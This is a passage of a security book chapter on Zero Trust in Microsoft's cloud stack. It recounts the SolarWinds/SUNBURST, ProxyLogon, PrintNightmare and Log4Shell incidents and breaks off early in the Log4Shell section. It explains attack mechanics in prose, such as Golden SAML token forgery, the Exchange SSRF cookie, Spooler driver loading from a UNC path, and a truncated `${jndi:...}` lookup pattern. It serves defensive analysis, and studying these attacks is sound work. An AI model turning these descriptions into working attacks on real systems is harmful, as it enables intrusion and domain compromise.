# Zero Trust

::: trust-ledger

- **Inherits:** The entire on-box chain, now demoted from *the story* to *signals*. Silicon: a machine can prove it booted measured, hardware-anchored state (Chapter 5, Attestation) rooted in the TPM and Pluton (Chapter 2, The TPM; Chapter 3, Pluton) behind Secure Boot (Chapter 1) and Measured Boot (Chapter 4). Kernel: VTL1 isolation a ring-0 attacker cannot map (Chapter 6, The Secure Kernel) and kernel-page immutability under HVCI (Chapter 8, Code Integrity). Credentials: the long-term secret off the box in `LsaIso.exe` (Chapter 15, Credential Guard), a device-bound sign-in key (Chapter 20, Windows Hello), and a TPM-bound Primary Refresh Token (Chapter 19, Pass-the-Hash to Pass-the-PRT).
- **Promise:** A cloud resource grants access from explicit signals (user identity, device identity and compliance, credential strength, risk, application, session) at sign-in/token issuance and, for CAE-aware sessions, at documented re-evaluation events, refusing trust derived from network location. Serviced boundary: the Conditional Access policy-decision point and the resource policy-enforcement point in Microsoft Entra.
- **TCB:** The identity provider's token-signing keys; the Conditional Access policy engine and the *correctness* of the policies it evaluates; the device-join keys and their TPM binding; the Intune/MDM compliance-attestation pipeline; and the endpoint reports that summarize each signal.
- **Adversary → Break:** The adversary in the SolarWinds campaign (Midnight Blizzard) stole an identity provider's token-signing key and used it to mint SAML assertions the cloud relying party accepted; ProxyLogon made the resource's own front end the attacker's server-side proxy; PrintNightmare exposed reachable legacy SYSTEM services on Domain Controllers; Log4Shell turned software inventory into emergency response. The Promise covers *policy evaluation*, not proof of *intent*, not *liveness after issuance*, not an *uncompromised policy engine*.
- **Residual:** Post-issuance token theft, replay, and continuous re-evaluation → Continuous Access Evaluation (Chapter 27); identity-provider signing-key compromise as a class (forged tokens the decision point cannot distinguish) → When the Chain Snaps: Storm-0558 (Chapter 29); the host-trusts-guest inversion for cloud workloads → Confidential VMs (Chapter 28).
- **Bequeaths:** "Hardware-rooted device and identity trust travels off the box as evaluable signals". The device context and identity a cloud access decision consumes, the floor Continuous Access Evaluation (Chapter 27) keeps live after the token is issued. Does NOT provide: continuous post-issuance re-evaluation, sender-constrained tokens, proof of user intent, or any defense once the policy engine's own signing key is compromised.
- **Proof:** 🔵 documented. `dsregcmd /status`, Microsoft Graph `signIn` / `deviceDetail` / `appliedConditionalAccessPolicy`, and Entra Conditional Access policy surfaces (Microsoft Learn); no lab-VM capture exists for this chapter's cloud control plane.
:::

> **The Reasoner's question.** How does hardware-rooted device trust become one input to a cloud access decision, and where does Zero Trust still have to trust what it cannot prove?

---

> **Foundations. What you need before this chapter.**
>
> - **Zero Trust.** Zero Trust is not a product and not a slogan meaning “trust nothing.” It is an architecture that removes the privileged-inside-network assumption and evaluates access from explicit signals: user identity, device identity, device compliance, credential strength, application, data sensitivity, location, risk, and session state. Kindervag coined the phrase in 2010; BeyondCorp showed a production implementation; NIST SP 800-207 is the vendor-neutral architecture; Microsoft’s current short form is “verify explicitly, use least privilege, assume breach” [1114], [1115], [1116], [1117].
> - **PDP / PEP.** NIST SP 800-207 names the **Policy Decision Point** as the component that evaluates policy and the **Policy Enforcement Point** as the component that enforces the decision. In Microsoft’s cloud stack, Conditional Access is a practical PDP implementation for many Microsoft Entra ID access decisions; the resource and token-issuance path provide enforcement surfaces [1116], [1118].
> - **Device identity.** A Microsoft Entra joined or hybrid joined Windows device has a tenant-side device object and local keys/certificates that let it prove which device is speaking. `dsregcmd /status` is the operator surface for that local join, key, and SSO state [1119].
> - **Primary Refresh Token (PRT).** The PRT is the seam between Windows sign-in and cloud SSO. It is issued to first-party token brokers on Entra joined and hybrid joined devices. On TPM-capable devices, associated keys can be protected so the device proves possession rather than exporting the key [683].
> - **Compliance.** Compliance is a management assertion, usually from Intune or a partner MDM, that the device currently satisfies policy. In sign-in logs it appears as device detail such as `isCompliant` and `isManaged`. It is a policy input, not a magic proof of runtime cleanliness [1120].
> - **Conditional Access and CAE.** Conditional Access evaluates the request at sign-in and token issuance. Continuous Access Evaluation keeps selected resource sessions sensitive to critical events and certain policy changes after the initial token is issued [1118], [124].

---

## What the link is responsible for

Zero Trust is the first link in this book whose purpose is not to create a stronger local boundary. Its job is to make a cloud service refuse ambient trust. The old perimeter model let the network speak with institutional authority: inside the LAN was different from outside; VPN meant “in”; a workstation on the right subnet inherited confidence from its address. The incidents in this chapter were four receipts for the same architectural error. SolarWinds put malicious code inside the signed software supply chain. ProxyLogon made the public Exchange front end the entry point into the server-side trust boundary. PrintNightmare showed that legacy SYSTEM services on Domain Controllers were still reachable attack surface. Log4Shell made “what software is in my fleet?” an emergency question rather than an asset-management report.

The Windows trust chain therefore has to travel. A TPM-protected Windows Hello key can authenticate the user locally. A joined-device key can identify the machine. A PRT can bridge Windows logon into Entra SSO. Compliance can state that management policy was satisfied. Conditional Access can evaluate those facts with identity, application, location, risk, and session context. But none of those facts creates a new perimeter. Each is evidence. Each has scope. Each can be stale, missing, misconfigured, or true in a way that still fails to prove the user’s intent.

Hold the chapter’s model this way: **on-box trust protects keys and code from local theft; cloud trust decides whether the resulting identity and device context should touch data.** Zero Trust is the translation layer between those worlds. It is stronger than a network moat because it does not confuse location with authority. It is weaker than a proof system because it still depends on endpoint reports, identity-provider signing keys, management assertions, and policy correctness.

## Eighteen thousand signatures, all valid

On December 13, 2020 (a Sunday) Mandiant Threat Intelligence pushed a blog post to FireEye's website titled "Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor." The post named a single binary, `SolarWinds.Orion.Core.BusinessLayer.dll`, that had been digitally signed by SolarWinds' legitimate code-signing certificate and distributed through SolarWinds' own update server between February and June 2020 [1121]. The next day, SolarWinds filed a Form 8-K with the U.S. Securities and Exchange Commission stating that the actual number of customers who installed the updates between March and June 2020 was fewer than 18,000 [1122].

Two months after that, Microsoft President Brad Smith testified to the U.S. Senate Select Committee on Intelligence that the number of follow-on victims who had been targeted with further lateral movement (via a token-forgery primitive against Active Directory Federation Services) was fewer than 100 [1123].

The architectural lesson is in the gap between those two numbers. Eighteen thousand organizations validated the Authenticode signature on a binary [513], executed it as trusted code, and did exactly what an endpoint protection product is specified to do: nothing, because the binary was signed by a vendor on the trusted publisher list. The attacker then chose roughly one hundred targets to pursue further. The signature was real. The build pipeline that produced the signature was compromised. Ken Thompson's 1983 Turing Award lecture "Reflections on Trusting Trust," published in *Communications of the ACM* in August 1984, had predicted this exact class thirty-six years earlier [1124,1125]; in December 2020 the Windows industry collected the receipt.

> **Quote.**
> This is the largest and most sophisticated attack the world has ever seen... we have seen substantial evidence that points to the Russian foreign intelligence agency, and we have found no evidence that leads us anywhere else.: Brad Smith, Microsoft President, U.S. Senate Select Committee on Intelligence, February 23, 2021 [1123]

SolarWinds was the first of four incidents the Windows blue team did not have a vocabulary for. ProxyLogon arrived in March 2021 and broke the assumption that on-premises Exchange Server fleets were bounded by the corporate firewall. PrintNightmare arrived in June-July 2021 and broke the assumption that legacy services running as SYSTEM on Domain Controllers were not on the attack surface. Log4Shell arrived in December 2021 and broke the assumption that "what software is in my fleet" was an answerable question.

Four incidents. Thirteen months. Four assumptions that the prior decade had quietly elevated to invariants. If the signature was real and the build was compromised, then "protect the endpoint" was protecting the wrong thing. Where did the threat model go?

## Why 2020 was the inflection point

The four incidents did not happen because 2020 was uniquely insecure. They happened because the structural conditions had been gathering for a decade, and three of them converged that year.

**The endpoint-protection era's high-water mark.** By 2019, the operational consensus across Windows fleets was that endpoint-centric defense-in-depth had become tractable. Credential Guard (2015) isolated LSASS secrets in a virtualization-based enclave [1126]. Windows Defender ATP (2016) streamed kernel-level telemetry to a security operations center. BloodHound (2016) made the on-premises Active Directory graph queryable as attack paths rather than as object permissions [1127]. Device Guard and WDAC (2017) constrained kernel and userspace code identity. The threat model was the endpoint. The perimeter was the VPN. The build pipeline was the vendor's problem. The cloud identity layer was Conditional Access on a handful of policies. The blue team's frame of reference was finite and bounded.

> **Sidebar.** Microsoft's 2021 Digital Defense Report framed the post-event detection posture honestly: the industry had become good at *finding* attackers after the fact, less good at *stopping* them at first execution [1128]. Detection and response as the load-bearing primitive is precisely the posture that SolarWinds invalidated: because the binary that ran was the one the EDR was specified to trust.

**The pandemic-era expansion of the attack surface.** From March 2020 onward, remote work shifted authentication to cloud identity providers, exposed VPN and RDP gateways at unprecedented scale, and made internet-facing Exchange near-universal in the mid-market. None of this *caused* SolarWinds (the SolarWinds build-pipeline access had begun in September 2019) but it reshaped which incidents had the most operational impact when they landed. An Exchange Server fleet that had been ten internal users behind a VPN in 2019 was a hundred external users on the public internet in 2021. ProxyLogon would have been a serious incident in 2019. In 2021 it was a federal emergency.

> **Definition, Supply-chain compromise.**
> An attack in which an adversary alters software, hardware, or services *before* the legitimate vendor delivers them, so that the eventual victim trusts the malicious artifact by virtue of trusting the vendor's identity. The compromise can occur at the source (commit signing keys), the build (the compiler or build server), the distribution (the update channel), or the installation (the package manager). SUNBURST was a *build-pipeline* compromise: SolarWinds' source remained clean; the build server inserted SUNBURST code into the compiled artifact, then signed it with SolarWinds' legitimate code-signing certificate.

**The state of supply-chain assurance circa 2020.** SLSA, the framework that would later codify "what does it mean for a build to be trustworthy" [1129,1130], did not yet exist; Google announced it in June 2021. Reproducible builds were a research aspiration on a handful of Linux distributions. CycloneDX [1131] and SPDX [1132] existed as bill-of-materials specifications but had no federal mandate behind them. in-toto [1133] was the only deployed cryptographic-attestation framework for build steps, and adoption was minimal. Executive Order 14028, which would make Software Bill of Materials provision a federal procurement requirement, was still six months away [1134]. The build pipeline was not threat-modeled as attacker territory because no one had a name for the territory yet.

> **Sidebar.** The same 2020-2023 window also produced a parallel criminal-economy track this chapter does not walk operationally: the human-operated ransomware cluster of Conti, REvil, DarkSide, and BlackCat / ALPHV, and the supply-chain-adjacent ransomware incidents Colonial Pipeline (May 2021, DarkSide), JBS Foods (May 2021, REvil), and Kaseya VSA (July 2, 2021, REvil). Kaseya is the non-Microsoft supply-chain parallel to SolarWinds: compromise the MSP-tier remote-monitoring platform, downstream MSPs and their customers receive trojanized commands, an architectural class that is not Microsoft-specific [1135]. The canonical primaries are CISA / FBI / NSA / USSS Joint Advisory AA21-265A on Conti [1136], the July 6, 2021 CISA-FBI Kaseya guidance [1135], the April 2022 FBI Flash and CISA alert on BlackCat / ALPHV [1137], and the February 2022 US/UK/AU joint ransomware advisory AA22-040A [1138]. Microsoft's canonical framing for "human-operated ransomware" lives in the Digital Defense Report 2022 Cybercrime chapter [1139]; readers wanting the operational ransomware-economy treatment should start there.

Taken together, these three threads produced an industry in which the trust-anchor primitives (signed code, perimeter firewalls, default-enabled SYSTEM services, "what library are we using") had all been quietly elevated to invariants while the conditions that made them invariant were eroding. The four incidents are not four bugs; they are four exposures of those four assumptions.

## The four incidents

### SolarWinds / SUNBURST: Supply chain at silicon

Five days before Mandiant published the SUNBURST analysis, FireEye's CEO Kevin Mandia disclosed that "a highly sophisticated state-sponsored adversary" had stolen FireEye's internal Red Team tooling [1140]. The disclosure triggered an internal investigation that traced the access path through FireEye's own SolarWinds Orion deployment. By the time Mandiant pushed the December 13 blog, the chain was named, the affected DLL was identified, and the federal response was already moving: CISA's Emergency Directive 21-01 went out the same day, ordering every Federal Civilian Executive Branch agency to disconnect or power down SolarWinds Orion products [1141].

**The exploit chain.** The SolarWinds build pipeline had been compromised since approximately September 2019, eight months before the trojanized builds reached customers [1142]. Between February and June 2020, the SolarWinds release process produced four signed versions of Orion that contained additional code added during the build itself, after the source was clean but before the artifact was signed. The compromised builds embedded a backdoor Mandiant named SUNBURST inside `SolarWinds.Orion.Core.BusinessLayer.dll` [1121]. SUNBURST was deliberately quiet: it slept for up to two weeks after install, camouflaged its callback traffic as legitimate Orion telemetry, generated its command-and-control hostnames from a domain-generation algorithm rooted at `avsvmcloud.com`, and ignored any host whose environment matched the attacker's exclusion list (which included most security vendors and some forensic tooling). On selected targets, SUNBURST loaded a second-stage Cobalt Strike beacon named TEARDROP [1121] or its variant Raindrop [1143], and from there the attacker pursued domain compromise of the on-premises Active Directory.

**SUNSPOT: the build-time injector.** Mandiant's December 13 post named the SUNBURST artifact but did not yet describe *how* the trojanized DLL got into the build. On January 11, 2021, CrowdStrike Intelligence published an analysis of the injector itself, codenamed SUNSPOT, co-published with SolarWinds' own root-cause investigation update [1144,1142]. SUNSPOT was a Windows binary present on the SolarWinds build server as `taskhostsvc.exe`. It monitored running processes for `MsBuild.exe`, walked the new process's environment to find the directory of the Orion Visual Studio solution, located the source file `InventoryManager.cs`, replaced its contents on disk with a SUNBURST-bearing version just before the C# compiler read the file, waited for the build to finish, then atomically restored the original file. Because the substitution happened in the narrow window between MsBuild reading the source and the compiler emitting the binary, the source repository at rest never showed evidence. The artifact on disk after the build looked exactly like the artifact a clean build would have produced: except that the compiled bytes embedded SUNBURST.

> **Definition, SUNSPOT.**
> The build-time injector CrowdStrike identified as the SolarWinds-side companion to SUNBURST [1144]. SUNSPOT is the operational realization at production scale of the threat model Ken Thompson described in 1984: the build process is the trust boundary, and an attacker who controls the build process produces an artifact whose signature is correct but whose semantics are not what the source code says.

The on-premises compromise was the means. The cloud pivot was the end. Once the attacker controlled the on-premises ADFS server's token-signing private key, the chain shifted to Golden SAML.

> **Definition, Golden SAML.**
> A token-forgery technique introduced by Shaked Reiner of CyberArk Labs in November 2017 [1145]. If an attacker obtains the token-signing private key of a SAML 2.0 identity provider (typically the on-premises Active Directory Federation Services token-signing certificate), the attacker can forge a SAMLResponse for any user, with any group memberships, valid for any duration. Service providers that trust the federation cannot distinguish forged tokens from legitimate ones. Reiner published a reference implementation called `shimit` alongside the disclosure [1146]. The naming is a deliberate parallel to Mimikatz's Golden Ticket against Kerberos.
>
> **Definition, SUNBURST.**
> The first-stage backdoor that Mandiant identified inside `SolarWinds.Orion.Core.BusinessLayer.dll` in December 2020 [1121,1122]. SUNBURST established initial command and control over HTTPS, blending into the volume of telemetry that legitimate Orion deployments generated.

![Figure: The SUNSPOT-to-SUNBURST chain: from build-time source replacement on the SolarWinds build server to forged cloud tokens via Golden SAML against ADFS.](diagrams/sunburst-golden-saml.svg)

**Blast radius.** SolarWinds' December 14 Form 8-K stated that fewer than 18,000 customers installed the trojanized updates between March and June 2020 [1122]. Brad Smith's February 23 Senate testimony placed the count of follow-on victims pursued via lateral movement at fewer than 100 [1123]. On April 15, 2021, the White House formally attributed the operation to the Russian Foreign Intelligence Service (SVR), with coincident sanctions and the expulsion of ten Russian diplomats [1147]. The activity cluster Mandiant had originally tracked as UNC2452 was merged into APT29 in April 2022 [1148]; Microsoft's Nobelium designation was retired on April 18, 2023 in favor of "Midnight Blizzard" under the new weather-themed actor-naming scheme [1149].

> **Sidebar.** The renaming pile-up matters operationally. Detection rules written against "UNC2452" in early 2021, against "APT29" after May 2022, and against "Midnight Blizzard" after April 2023 all reference the same actor cluster, but tooling and queries that anchor on a single name miss the others. Mandiant's SUNBURST countermeasure repository preserves the original IOCs [1150].

**Vendor response and federal action.** CISA's January 8, 2021 Cybersecurity Advisory AA21-008A was the first federal advisory to name forged authentication tokens, federated identity bypass, and cloud-side persistence as a coherent detection priority [1151]. CISA released an open-source detection tool, Sparrow, with the advisory. SolarWinds shipped Orion 2020.2.1 HF 2 as the hotfix sequence. The April 13, 2021 Department of Justice action against ProxyLogon web shells (covered below) and the April 15 White House attribution and sanctions package effectively closed the public-sector response cycle within four months of the December 13 disclosure.

> **Aside. Why this is the Thompson 1984 receipt.**
> In his 1983 Turing Award lecture, published in *Communications of the ACM* in August 1984, Ken Thompson described a self-referential modification to a compiler that produced a backdoor in any program the compiler subsequently compiled, including future copies of the compiler itself [1124,1125]. The construction has a property that is easy to state and hard to confront: no amount of source-code auditing reveals the backdoor, because the backdoor is not in any source code. It is in the compiler's behavior.
>
> SUNBURST is not the same construction. The compromise was at the build server rather than the compiler, and the attacker's code was added to the artifact rather than inserted by a self-replicating modification. The relevant similarity is architectural rather than mechanical. In both cases the trust anchor (the compiler in Thompson's lecture, the publisher's code-signing certificate in SUNBURST) was doing exactly what it was specified to do. The auditor of a backdoored binary cannot find the backdoor in the source. The customer of a backdoored vendor cannot find the backdoor in the signature. The chain of evidence is intact at the level the verifier is checking; the failure is at a level the verifier was never specified to check.
>
> Thompson's closing sentence ("You can't trust code that you did not totally create yourself") reads in 1984 as a thought experiment and in 2020 as an operational claim about the build pipelines of every software vendor in the Authenticode trust list.
>
> **Key idea.**
> Signed code from your vendor is not trustworthy if your vendor's build pipeline is compromised. Authenticode signs the publisher's binary; it does not sign the build that produced the binary. The eighteen thousand SUNBURST recipients did exactly what their endpoints were specified to do.

If the entry was a signed update from a trusted vendor, the entry was inside the perimeter before the perimeter was tested. The second incident showed what happens when the entry *is* the perimeter.

### HAFNIUM / ProxyLogon: The front-end that pre-authenticated for the back-end

Two independent researcher pipelines converged on the same Exchange vulnerability chain within days of each other in January 2021. Volexity's Steven Adair and team observed exploitation activity against customer Exchange Server deployments as early as January 6, 2021: a date Volexity later revised to January 3, 2021 in their March 8 update to "Operation Exchange Marauder" [1152]. Both January dates are *earliest-observed exploitation* dates, not detection or zero-day-identification dates; the chain was already in operator hands when Volexity's customer-side incident-response telemetry surfaced it. DEVCORE's Cheng-Da "Orange Tsai" Tsai arrived at the same chain independently through code review and reported it to MSRC on January 5 [1153]. Both reports landed at Microsoft Security Response Center; both researchers held the disclosure as MSRC worked on a patch. On March 2, 2021 (a Tuesday, but not a Patch Tuesday) Microsoft shipped out-of-band updates for all supported Exchange Server versions [1154].

**The exploit chain.** The audit-correct shape of the chain is *three* CVEs, not four. CVE-2021-26855 is a server-side request forgery in the Exchange Server front-end that allows an unauthenticated attacker to send requests to the back-end as if the requester were Exchange itself [1155]. CVE-2021-27065 is a post-authentication arbitrary file write that the attacker reaches *via* the SSRF, allowing an attacker-chosen ASPX web shell to be written to a server-controlled directory [1156]. The shell then executes under the Exchange process identity, which is SYSTEM. A separate file-write primitive (CVE-2021-26858) provides a parallel path to the same web-shell drop after authentication.

> **Definition, SSRF (Server-Side Request Forgery).**
> A class of vulnerability in which an attacker induces a server to issue requests on the attacker's behalf, typically to internal resources that the attacker could not reach directly. CVE-2021-26855 was an SSRF in the Exchange Server front-end (the Client Access role): a forged X-BEResource cookie caused the front-end to proxy attacker-supplied requests to the Exchange back-end with the proxy's own authentication context, bypassing the Exchange authentication boundary entirely.

CVE-2021-26857 sits in a parallel position. It is an insecure deserialization in Exchange's Unified Messaging service that yields code execution as SYSTEM, but only *to an attacker who already holds administrator rights or has chained another vulnerability to obtain them* [1156]. It does not require the SSRF step. Treating ProxyLogon as a single linear chain of four CVEs is the common simplification; the audit-correct framing is three CVEs in the linear SSRF-to-web-shell path and one separate authenticated RCE primitive in a parallel position.

> **Callout.**
> The "four chained zero-days" shorthand collapses two distinct attack-class shapes and obscures the SSRF-as-load-bearing-primitive observation. The chain that proxies through 26855 does not pass through 26857; 26857 was an independent RCE primitive available to an attacker who already held Exchange administrator rights (or chained another vulnerability to obtain them), which is a different threat-model class from the pre-auth SSRF.

![Figure: ProxyLogon's audit-correct shape: the three-CVE pre-authentication chain that walks through the Exchange front-end SSRF (left), and the separate, parallel CVE-2021-26857 Unified Messaging deserialization RCE reachable by any already-authenticated user (right). Both converge on code execution as SYSTEM.](diagrams/13-zero-trust-proxylogon.svg)

**Blast radius.** Pre-patch numbers come from contemporaneous reporting with different scopes. Brian Krebs reported on March 5, 2021 that "at least 30,000" U.S. organizations had been compromised [1157]. Bloomberg's March 7 reporting placed the known global victim count at "at least 60,000" organizations, citing a former senior U.S. official with knowledge of the investigation [1158]. After Microsoft's March 2 patch shipped, the chain was widely weaponized by additional actor groups (LuckyMouse, Tick, Calypso, Winnti, and others) per ESET's March 10, 2021 enumeration of at least ten APT groups exploiting the same chain [1159]. Krebs's contemporaneous reporting also cited experts who described "hundreds of thousands" of Exchange servers worldwide as having been seeded with web shells [1157]. That larger figure is best read as a post-disclosure, post-patch indiscriminate-exploitation class, not a pre-patch numerator. Microsoft attributed the original campaign to a Chinese state-sponsored actor it named HAFNIUM, later renamed Silk Typhoon under the weather-themed scheme in April 2023 [1154,1149].

> **Sidebar.** HAFNIUM became Silk Typhoon at the same April 18, 2023 rename pass that made Nobelium into Midnight Blizzard [1149]. Microsoft's threat-actor naming history matters because mid-cycle renames can fragment detection coverage; rules keyed on the old name will silently stop matching new advisories.

**Vendor response and federal action.** Beyond the March 2 out-of-band patches, Microsoft released a one-click mitigation tool on March 8 and the Exchange On-premises Mitigation Tool on March 15. The Department of Justice and FBI then took an unprecedented step.

> **Aside: The FBI's Rule 41 web-shell removal.**
> On April 13, 2021, the U.S. Department of Justice announced that the FBI had executed a court-authorized operation under Rule 41 of the Federal Rules of Criminal Procedure to access compromised on-premises Exchange servers in the United States, copy the attacker-installed web shells, and remove them: without the system owners' prior consent or notification [1160,1161]. Owners were notified afterward.
>
> The legal mechanism is worth pausing on. Rule 41, as amended in 2016, allows a single magistrate judge to authorize searches of computers whose location is unknown or whose location is in five or more judicial districts. The April 13 operation was the first major use of that authority to *remediate* third-party systems at scale, rather than to investigate. The precedent matters: every subsequent federal incident response that contemplates active intervention on private systems sits in the shadow of this order.

The architectural lesson is at the level of the product design. Exchange Server's front-end and back-end were specified to communicate over an authenticated trust boundary inside a single deployment. CVE-2021-26855 made the front-end act as the attacker's proxy *into* the back-end; the SSRF did not bypass the trust boundary, it relocated to its server-side end and walked through it. On-premises server fleets that organizations control are still on the public internet, and the entry-point class is "the front-end proxy that pre-authenticates traffic for the back-end."

If the supply-chain class compromised the signed code on the endpoint, the on-premises server class compromised the boundary readers thought was between the endpoint and the internet. The third incident compromised the boundary *inside* the perimeter.

### PrintNightmare: The legacy SYSTEM service on every Domain Controller

On Patch Tuesday, June 8, 2021, Microsoft shipped a fix for CVE-2021-1675 [1162] and labeled the vulnerability as an Elevation of Privilege in the Windows Print Spooler. Two weeks later (with no announcement, no out-of-band advisory, and no community notification), the MSRC entry was edited to add Remote Code Execution to the impact classification. Sangfor's Zhiniang Peng and Xuefeng Li had reported the EoP behavior [1163]; the silent reclassification suggested an RCE primitive existed in the same surface that the June 8 patch had not closed. On June 29, believing the chain was now patched, Sangfor pushed a proof-of-concept to GitHub [1163,1164]. The repository was taken down within hours; copies preserved in forks (notably cube0x0's Impacket port) became the artifact-of-record.

CERT/CC's Will Dormann reproduced the chain the next day and published Vulnerability Note VU#383432 with a sentence that the Windows operations community spent the rest of the week re-reading [1164]:

> **Quote.**
> While Microsoft has released an update for CVE-2021-1675, it is important to realize that this update does NOT protect against public exploits that may refer to PrintNightmare or CVE-2021-1675.. Will Dormann, CERT/CC VU#383432, June 30, 2021

On July 1, Microsoft assigned a new CVE (CVE-2021-34527) for the broader RCE surface and acknowledged that it was "similar but distinct" from CVE-2021-1675 [1165]. Out-of-band patches followed on July 6-7 for every supported Windows release, including unusual coverage for Windows 7 and Server 2008. On July 13, CISA issued Emergency Directive 21-04 ordering federal civilian agencies to apply the patches immediately and to disable or restrict the Print Spooler on Domain Controllers as a standing mitigation [1166]. Microsoft followed with KB5005010 on July 14, documenting the supplementary Point-and-Print hardening required to close the residual surface [1167].

> **Sidebar.** The Sangfor commit was preserved in forks because GitHub's fork model maintains each fork as an independent copy of the upstream repository's commit object graph, retained regardless of subsequent upstream deletion [1168]. The fork [1163] became the de facto preserved artifact-of-record, with Sangfor's original authorship credited in the README. The story is a study in the asymmetry of disclosure timing: a vendor can take down a repository, but cannot retract the bytes that have already left.

**PrintNightmare had a prior.** Thirteen months earlier, on May 12, 2020, Alex Ionescu and Yarden Shafir published "PrintDemon" against the same service, the same SYSTEM context, and the same fundamental design assumption that PrintNightmare would expose more deeply [1169]. PrintDemon (CVE-2020-1048) exploited the Spooler's printer-port abstraction: a printer port name was an opaque string the Spooler treated as a destination, and an unprivileged user could set the port name to an arbitrary file path. The Spooler would then write the print job bytes to that path (with SYSTEM privileges) producing arbitrary file write as SYSTEM through three PowerShell one-liners (`Add-Printer`, set port, `Out-Printer`) that any standard user could run. SafeBreach Labs' Peleg Hadar and Tomer Bar independently reported the same surface, reverse-engineered the May Microsoft patch, and presented related Spooler work at Black Hat USA 2020 [1170].

The design flaw is the same in both cases: the Spooler's RPC interface trusts caller-supplied strings (port names in PrintDemon; driver-package paths in PrintNightmare) without enforcing caller-side permissions on the file paths they resolve to. PrintDemon's primitive was arbitrary *file write* as SYSTEM. PrintNightmare's primitive was arbitrary *code execution* as SYSTEM via DLL load. The May 2020 to June-July 2021 progression is the canonical "expand the primitive" vulnerability-research arc: same service, same trust assumption, incrementally more dangerous primitive.

| Dimension | PrintDemon (CVE-2020-1048) | PrintNightmare (CVE-2021-1675 / CVE-2021-34527) |
|---|---|---|
| Disclosure | May 12, 2020 Patch Tuesday | June 8 (EoP), July 1 (RCE), July 6-7 OOB |
| Researchers | Ionescu, Shafir; SafeBreach Hadar, Bar | Sangfor Peng, Li; CERT/CC Dormann |
| Vulnerable RPC primitive | Printer-port name accepts arbitrary path | `RpcAddPrinterDriverEx` loads driver from UNC |
| Primitive class | Arbitrary file write as SYSTEM | Arbitrary code execution as SYSTEM |
| Caller privilege required | Standard local user | Authenticated domain user |
| Domain Controller impact | Local file-write only | Remote SYSTEM RCE on every DC running Spooler |
| Disclosure model | Coordinated, Patch Tuesday | Coordinated, then accidental PoC, then OOB |

PrintNightmare is the wider case of an attack-class PrintDemon had already opened. The architectural lesson is that a vulnerability researcher who finds *any* primitive in a SYSTEM-privileged Windows RPC service should be treated as a signal that the broader surface needs review, not as a point-fix candidate.

**The exploit chain.** The Windows Print Spooler service (`spoolsv.exe`) runs as SYSTEM on every Windows machine and is enabled by default, including on Domain Controllers. The Spooler exposes two Remote Procedure Call interfaces (MS-RPRN and MS-PAR) used by clients to query printers, submit jobs, and install drivers. `RpcAddPrinterDriverEx` is the RPC method that installs a new printer driver. As shipped before July 2021, the method accepted a driver path specified as a UNC, fetched the driver file from that path, and loaded it into the Spooler process. Which runs as SYSTEM. An authenticated domain user could call `RpcAddPrinterDriverEx` against any reachable Spooler with the driver path pointing to an attacker-controlled share, and obtain SYSTEM execution in the target Spooler process. Domain Controllers running Spooler by default meant any authenticated domain user obtained SYSTEM on every DC. Domain compromise followed.

> **Definition: MS-RPRN / Print Spooler RPC.**
> The MS-RPRN Print System Remote Protocol is the canonical Windows RPC interface for printer management. Per the Microsoft Open Specifications Appendix B Product Behavior, the earliest applicable Windows version is Windows NT 3.1 (1993). It exposes interfaces for printer enumeration, job management, and driver installation. Because Spooler hosts the interface and runs as SYSTEM, every reachable Spooler is a potential SYSTEM-level RPC endpoint. PrintNightmare exploited the `RpcAddPrinterDriverEx` method specifically; the related `RpcAsyncAddPrinterDriver` method is the asynchronous variant Dormann documented as the alternative entry point.

![Figure: PrintNightmare. An authenticated domain user drives the SYSTEM-level Print Spooler on a Domain Controller; the link that breaks is the Spooler trusting a caller-supplied UNC path and loading the attacker driver DLL under its own SYSTEM token, yielding SYSTEM execution on the DC and domain compromise.](diagrams/13-zero-trust-printnightmare.svg)

> **Aside: The silent-reclassification disclosure problem.**
> PrintNightmare turned on a vendor practice that the disclosure community had not previously named as a primitive: a security advisory whose classification changed without notice. The June 8 publication of CVE-2021-1675 said EoP. The mid-June revision said EoP and RCE. There was no out-of-band advisory, no email to affected administrators, no public callout. The reclassification was visible only to people who happened to revisit the MSRC page.
>
> Sangfor's accidental PoC was, in a real sense, an artifact of the reclassification. The researchers believed the patched June 8 chain was the same chain they had reported and that the published patch covered their proof-of-concept. The change-without-notice meant the patch they were testing was incomplete and the demonstration they were publishing was live. The CERT/CC follow-up demonstrated the same point from the verifier side: a reproducer ran against a fully patched Windows Server 2019 Domain Controller and got SYSTEM.
>
> The post-PrintNightmare disclosure-norms debate spent the next two years working through the implications. Should reclassifications trigger a fresh CVE assignment so the change has its own visible identifier? Should advisories carry change logs analogous to those on RFCs? Should vendors notify researchers credited for one CVE when the classification is broadened? MSRC's current practice has moved toward more transparent change tracking; the 2021 silent reclassification remains the canonical counterexample.

The architectural lesson is that the Windows attack surface still includes services dating from Windows NT 3.1, designed for a single-domain office LAN, running with SYSTEM-equivalent privileges on every Domain Controller by default. A silent vendor reclassification from EoP to RCE is itself an adversarial signal. It is what leaks the technique.

> **Callout, defensible architecture.**
> The defensible architecture for legacy Windows RPC surfaces is to constrain who can reach them and what privileges the host process holds when they are reached. Disabling Print Spooler on Domain Controllers (per CISA ED 21-04 [1166]) and enabling the Point-and-Print restrictions in KB5005010 [1167] are the immediate hardening; the long-arc architectural answer is the same one that closes the ProxyLogon class, namely treating any service exposing RPC at SYSTEM as an internet-facing surface even when the network topology says otherwise.

If the supply-chain class compromised the signature and the on-premises server class compromised the perimeter, PrintNightmare compromised the *inside* of the trust boundary: the Domain Controller itself. The fourth incident showed that even the boundary of the application stack was not a boundary.

### Log4Shell: The universal library and the transitive dependency graph

On November 24, 2021, Chen Zhaojun of Alibaba Cloud Security emailed the Apache Software Foundation with a vulnerability in Log4j 2.x: any message that the application logged, if it contained a `${jndi:...}` substitution sequence, would trigger an outbound JNDI lookup [1171]. On December 9, the bug surfaced in Minecraft Java Edition community channels. Which mattered because Minecraft's chat handler logs the messages players send. Within hours, LunaSec's Free Wortley and Chris Thompson published the canonical writeup and coined the name "Log4Shell" [1172]. Apache shipped Log4j 2.15.0 on December 10. CVE-2021-44228 was scored CVSS 10.0 [1173]. On December 11, CISA Director Jen Easterly's official statement called Log4Shell a "severe risk" and "an urgent challenge to network defenders" [1174]. Two days later, on the CISA-convened national industry call, she went further: "one of the most serious I've seen in my entire career, if not the most serious" [1175].

> **Key idea.**
> CVE-2021-44228 was the moment "what versions of what library are in my fleet" stopped being a procurement question and became a federal-advisory question. This is a synthesis of CISA AA21-356A and the Apache Log4j security history, not a quotation from either source.

